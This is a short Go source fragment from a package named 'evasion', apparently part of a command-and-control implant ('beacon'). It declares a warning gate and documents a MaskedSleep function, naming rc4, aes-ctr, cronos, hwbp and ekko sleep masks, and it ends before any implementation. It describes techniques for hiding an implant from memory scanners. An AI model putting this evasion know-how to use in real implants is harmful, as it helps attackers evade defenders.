//go:build linux

package evasion

import (
	"sync"
)

// linuxMaskWarnOnce gates the one-time warning for mask types that
// are not implemented on Linux at all.
var linuxMaskWarnOnce sync.Once

// MaskedSleep dispatches on the mask type. The rc4 and aes-ctr
// masks are implemented on linux/amd64; see sleepmask_linux_amd64.go.
// The Windows-only masks (cronos, hwbp, ekko) fall through to a
// plain sleep with a one-time warning. Any other value also falls
// through with a warning.
//
// The sleep always happens for the full requested duration, in every
// branch. A function that returns without sleeping causes the
// beacon's run loop to busy-spin, which is worse than a weak mask.
